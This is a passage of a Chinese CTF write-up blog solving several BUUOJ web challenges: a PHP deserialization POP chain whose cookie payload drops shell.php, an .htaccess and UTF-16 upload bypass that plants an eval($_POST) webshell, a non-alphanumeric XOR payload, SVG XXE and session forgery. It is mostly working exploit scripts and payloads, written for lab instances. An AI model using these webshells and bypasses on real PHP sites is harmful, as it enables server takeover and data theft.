&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里肯定是利用<code>__call</code>函数去执行我们的命令了。</p>
+<p>构造POP链先找<code>__destruct</code>方法，很明显刚刚<code>Register.php</code>中就有析构函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们用<code>Register-&gt;checker = Profile</code>，利用<code>Profile-&gt;index()</code>去触发<code>Profile</code>类中的<code>__call</code>魔术方法。</p>
+<p>但是我们可以看到<code>Profile.php</code>当中的<code>__call</code>方法调用的参数是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过文档我们可以知道<code>$name</code>是不存在方法的调用的名字，在这里也就是<code>index</code>，<code>$arguments</code>就是传入调用方法的参数，这里就为空。</p>
+<p>而当使用<code>$this-&gt;index</code>的时候，我们会触发另一个魔术方法<code>__get</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里又调用了<code>$this-&gt;except[$name]</code>，而<code>$name</code>我们可以通过<code>__call</code>调用的值确定为<code>index</code>，而且<code>Profile</code>类存在一个公有类<code>except</code>可以供我们修改。</p>
+<p>接着利用<code>_get</code>的返回会使<code>__call</code>方法中的<code>if</code>为真，执行<code>$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</code>。</p>
+<p>有了POP链之后，我们应该去调用什么函数呢，接着看<code>Profile.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>第一个if可以直接pass，第二个if语句如果我们不上传文件也可以直接通过，第三个if直接赋值绕过，然后可以构造图片马绕过<code>getimagesize</code>的判断，控制<code>$this-&gt;filename</code>为php后缀形式，这样利用<code>copy($this-&gt;filename_tmp, $this-&gt;filename)</code>就可以复制出了一个 php webshell 了。</p>
+<p>构造payload的exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$checker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $checker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp = <span class="string">&#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/00bf23e130fa1e525e332ff03dae345d.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">&#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/shell.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $ext = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register(<span class="keyword">new</span> Profile());</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure>
+<p>得到payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo0OntzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2FkZWVlMGMxNzBhZDRmZmIxMTBkZjBjZGUyOTRhZWNkLzAwYmYyM2UxMzBmYTFlNTI1ZTMzMmZmMDNkYWUzNDVkLnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvYWRlZWUwYzE3MGFkNGZmYjExMGRmMGNkZTI5NGFlY2Qvc2hlbGwucGhwIjtzOjM6ImV4dCI7YjoxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7YjowO30&#x3D;</span><br></pre></td></tr></table></figure>
+<p>填到cookie中，刷新页面</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724175540.png" alt=""></p>
+<p>蚁剑连接拿flag。</p>
+<h2 id="SUCTF2019-EasyWeb">SUCTF2019 EasyWeb</h2>
+<h3 id="考点-v6">考点</h3>
+<ul>
+<li>无字母数字webshell</li>
+<li>文件上传</li>
+<li>.htaccess利用</li>
+</ul>
+<h3 id="解题-v6">解题</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>和极客大挑战2019 RCE ME类似的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
+<p>可以成功显示PHPINFO的信息，注意四个点，一是PHP版本是7.2，二是题目的环境是Apache，三是限制了open_basedir，最后是disable_function。</p>
+<p>再来看get_the_flag函数，按照题意应该是想让我们通过调用get_the_flag函数来get shell，函数中有三个限制：</p>
+<ul>
+<li>文件内容中不能出现<code>&lt;?</code></li>
+<li>使用了exif_imagetype来判断是不是图片</li>
+<li>后缀名中不允许出现ph</li>
+</ul>
+<p>这里的限制条件就有点像SUCTF2019 CheckIn，不同的是那道题的环境是nginx，可以通过上传<code>.user.ini</code>来绕过。那么这道题如果要通过上传<code>.htaccess</code>来绕过后缀名的限制，就需要绕过<code>exif_imagetype</code>，并且不能用GIF89a等文件头，因为这样虽然能上传成功，但<code>.htaccess</code>文件无法生效。这时有两个办法：</p>
+<ul>
+<li>
+<p>在.htaccess前添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br></pre></td></tr></table></figure>
+<p><code>#</code>在<code>.htaccess</code>是注释符，所以<code>.htaccess</code>文件可以生效</p>
+</li>
+<li>
+<p>在.<code>htaccess</code>前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)<br>
+x00x00x8ax39x8ax39 是wbmp文件的文件头，<code>.htaccess</code>中以0x00开头的同样也是注释符，所以不会影响<code>.htaccess</code></p>
+</li>
+</ul>
+<p>最后就需要绕过<code>&lt;?</code>，同样也有两个办法，不过只是编码的不同而已，一种是base64编码，一种是uft-16编码，都来了解一下。</p>
+<p>先来看utf-16的编码方式，这是<code>.htaccess</code>文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337                          # Define the width</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .cc         # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure>
+<p>可以绕过的原因借用一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11207145.html#jCmcxrz8">tr1ple师傅的图</a></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707153040.png" alt=""></p>
+<p>也就是说原来是utf-8一个字符一个字节，现在utf-16是两个字节编码一个字符，那么明显可以绕过内容的过滤，exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Description : create and bypass file upload filter with .htaccess</span></span><br><span class="line"><span class="comment"># Author : Thibaud Robin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span></span><br><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = open(filename, <span class="string">&#x27;wb&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = open(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .cc\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line">        </span><br><span class="line">generate_htacess()</span><br><span class="line">generate_php_file(<span class="string">&quot;shell.cc&quot;</span>, <span class="string">&quot;&lt;?php eval($_POST[&#x27;shell&#x27;]); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>上传两个文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8bf8acd4-49c6-40c6-9bfe-688945f733ac.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span></span><br><span class="line">payload = &#123;&#125;</span><br><span class="line">headers = &#123;&#125;</span><br><span class="line">htaccess_files = [</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>, open(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">]</span><br><span class="line">shell_files = [</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>, open(<span class="string">&#x27;shell.cc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, files=htaccess_files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, files=shell_files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+<p>验证一下</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707163111.png" alt=""></p>
+<p>用蚁剑连接，加载绕过<a target="_blank" rel="noopener" href="https://github.com/Medicean/as_bypass_php_disable_functions">disable_function的插件</a></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707163432.png" alt=""></p>
+<p>第二种是用base64编码绕过</p>
+<p>htaccess文件内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType application&#x2F;x-httpd-php .cc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.cc&quot;</span><br></pre></td></tr></table></figure>
+<p>shell的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12 &#x2F;&#x2F; 12为了满足base64算法凑足八个字节</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pPz4&#x3D;  &#x2F;&#x2F;&lt;?php @eval($_POST[cmd])?&gt;的base64编码</span><br></pre></td></tr></table></figure>
+<h3 id="拓展">拓展</h3>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">.htaccess trick总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://dy.163.com/article/ECQSCP9E0511CJ6O.html">PHP7绕过open_basedir</a></p>
+<h2 id="BSidesCF2019-SVGMagic">BSidesCF2019 SVGMagic</h2>
+<h3 id="考点-v7">考点</h3>
+<ul>
+<li>
+<p>SVG文件格式</p>
+</li>
+<li>
+<p>XXE读取文件</p>
+</li>
+</ul>
+<h3 id="解题-v7">解题</h3>
+<p>先来看看什么是SVG。</p>
+<p>SVG 意为可缩放矢量图形（Scalable Vector Graphics）， <strong>使用 XML 格式定义图像</strong>。</p>
+<p>看一个实例</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818205345.png" alt=""></p>
+<p>用常规的XXE文件读取payload</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818205431.png" alt=""></p>
+<p>这个地方有个坑就是flag的文件位置在当前目录，<strong>而<code>proc/self/cwd</code>就代表当前路径。</strong></p>
+<h2 id="HFCTF2020-BabyUpload">HFCTF2020 BabyUpload</h2>
+<h3 id="考点-v8">考点</h3>
+<ul>
+<li>
+<p>代码审计</p>
+</li>
+<li>
+<p>session伪造</p>
+</li>
+</ul>
+<h3 id="解题-v8">解题</h3>
+<p>审计源码可以发现这几个点</p>
+<ul>
+<li>session中存储了身份信息，默认事guest</li>
+<li>通过参数可以上传文件和下载文件</li>
+</ul>
+<p>既然这样，那我们就先把session文件下载下来看看是什么样子的。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819190549.png" alt=""></p>
+<p>应该是用php_binary方式序列化的session。</p>
+<p>那么现在的思路就是：</p>
+<p>伪造admin session --&gt; 上传新的sess文件 --&gt; 将cookie改成sess文件sha256加密后的字符串</p>
+<p>但是现在还有一个问题就是如果绕过对success.txt的判断。</p>
+<p>由于文件名不可控，我们就无法上传一个名为success.txt的文件，但是file_exists函数的作用的是<strong>检查文件或目录是否存在</strong>，所以我们用attr创建一个名为success.txt的目录就可以过这个判断。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://0abaf9de-86a1-4b6e-ab78-f008f607f2d5.node3.buuoj.cn&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;up_file&quot;</span>: (<span class="string">&quot;sess&quot;</span>, BytesIO(<span class="string">b&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;download&quot;</span>,</span><br><span class="line">        <span class="string">&quot;attr&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, data=data, files=files)</span><br><span class="line">    session_id = hashlib.sha256(<span class="string">&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;</span>.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> session_id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_success</span>():</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;upload&quot;</span>,</span><br><span class="line">        <span class="string">&quot;attr&quot;</span>: <span class="string">&quot;success.txt&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;up_file&quot;</span>: (<span class="string">&quot;test&quot;</span>, BytesIO(<span class="string">b&#x27;good job!&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url, data=data, files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">upload_success()</span><br><span class="line">php_session_id = admin()</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: php_session_id</span><br><span class="line">&#125;</span><br><span class="line">s = requests.get(url)</span><br><span class="line">r = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<h2 id="HarekazeCTF2019-Avatar-Uploader-1">HarekazeCTF2019 Avatar Uploader 1</h2>
+<h3 id="考点-v9">考点</h3>
+<ul>
+<li>finfo_file函数和getimagesize函数的区别</li>
+</ul>
+<h3 id="解题-v9">解题</h3>
+<p>原题是给了源码。</p>
+<p>关键代码是在upload.php中</p>
